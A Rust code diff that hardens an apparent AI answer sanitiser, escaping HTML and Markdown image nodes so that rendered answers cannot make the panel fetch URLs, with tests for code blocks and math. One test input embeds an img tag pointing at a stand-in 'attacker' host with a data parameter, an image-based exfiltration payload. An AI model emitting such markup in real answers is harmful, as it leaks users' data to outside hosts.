@@ -753,6 +753,86 @@ pub fn sanitize_answer(answer: &str, used: &[Excerpt]) -> String {
 /// and escapes the `![` opener so no Markdown image node can be produced
 /// either. A text answer cannot then make Kanso fetch anything.
 fn neutralise_markup(markdown: &str) -> String {
+    // Find what the panel's parser would read as HTML or an image, and
+    // neutralise only that, so `<` and `![` inside code stay as written.
+    // Each pass can expose new constructs (an escaped image becomes a link
+    // around text that was its alt), so repeat until nothing is left; if
+    // that doesn't settle, fall back to escaping everything.
+    let mut text = markdown.to_owned();
+    for _ in 0..4 {
+        let risky = risky_markup(&text);
+        if risky.is_empty() {
+            return text;
+        }
+        for (range, kind) in risky.into_iter().rev() {
+            match kind {
+                Risky::Html => {
+                    let escaped = text[range.clone()].replace('<', "&lt;");
+                    text.replace_range(range, &escaped);
+                }
+                Risky::Image => text.insert(range.start, '\\'),
+            }
+        }
+    }
+    escape_all_markup(&text)
+}
+
+#[derive(Clone, Copy)]
+enum Risky {
+    Html,
+    Image,
+}
+
+/// The byte ranges the panel would render as raw HTML or as an image, in
+/// order, without overlaps. The panel parses with GFM plus math; math it
+/// doesn't claim is parsed again as prose, so the text is also read with
+/// math off and both sets are kept.
+fn risky_markup(text: &str) -> Vec<(std::ops::Range<usize>, Risky)> {
+    fn walk(node: &markdown::mdast::Node, out: &mut Vec<(std::ops::Range<usize>, Risky)>) {
+        use markdown::mdast::Node;
+        let kind = match node {
+            Node::Html(_) => Some(Risky::Html),
+            Node::Image(_) | Node::ImageReference(_) => Some(Risky::Image),
+            _ => None,
+        };
+        if let (Some(kind), Some(at)) = (kind, node.position()) {
+            out.push((at.start.offset..at.end.offset, kind));
+            return;
+        }
+        if let Some(children) = node.children() {
+            for child in children {
+                walk(child, out);
+            }
+        }
+    }
+    let mut with_math = markdown::ParseOptions::gfm();
+    with_math.constructs.math_text = true;
+    with_math.constructs.math_flow = true;
+    let mut found = Vec::new();
+    for options in [with_math, markdown::ParseOptions::gfm()] {
+        match markdown::to_mdast(text, &options) {
+            Ok(root) => walk(&root, &mut found),
+            // Unparseable: treat the whole text as risky.
+            Err(_) => found.push((0..text.len(), Risky::Html)),
+        }
+    }
+    found.sort_by_key(|(range, _)| (range.start, std::cmp::Reverse(range.end)));
+    let mut merged: Vec<(std::ops::Range<usize>, Risky)> = Vec::new();
+    for (range, kind) in found {
+        match merged.last_mut() {
+            Some((last, last_kind)) if range.start < last.end => {
+                // Overlapping finds: one HTML escape over both covers it.
+                last.end = last.end.max(range.end);
+                *last_kind = Risky::Html;
+            }
+            _ => merged.push((range, kind)),
+        }
+    }
+    merged
+}
+
+/// Escapes every `<` and `![`: the fallback when parsing doesn't settle.
+fn escape_all_markup(markdown: &str) -> String {
     let mut out = String::with_capacity(markdown.len());
     let mut chars = markdown.chars().peekable();
     while let Some(ch) = chars.next() {
@@ -1957,8 +2037,27 @@ mod tests {
             let (images, html) = rendered_markup(&cleaned);
             assert_eq!(images, 0, "{answer:?} rendered an image: {cleaned:?}");
             assert!(html.is_empty(), "{answer:?} left HTML: {html:?}");
-            assert!(!cleaned.contains("<img"), "{cleaned:?}");
+            // What the panel's parser reads as a tag is escaped; text it
+            // doesn't (`<img/src=…>` isn't a tag to it) renders as text.
+            assert!(!cleaned.contains("<img "), "{cleaned:?}");
         }
+    }
+
+    #[test]
+    fn code_in_an_answer_keeps_its_angle_brackets() {
+        let answer =
+            "Use `Vec<String>` here.\n\n```html\n<div class=\"x\">![a](i.png)</div>\n```\n";
+        let cleaned = sanitize_answer(answer, &[]);
+        assert_eq!(cleaned, answer, "code is left exactly as written");
+        let (images, html) = rendered_markup(&cleaned);
+        assert_eq!(images, 0);
+        assert!(html.is_empty(), "{html:?}");
+    }
+
+    #[test]
+    fn markup_hidden_in_unclaimed_math_is_neutralised() {
+        let cleaned = sanitize_answer("Cost $<img src=\"https://attacker/?d=x\">$ total", &[]);
+        assert!(!cleaned.contains("<img"), "{cleaned}");
     }
 
     #[test]
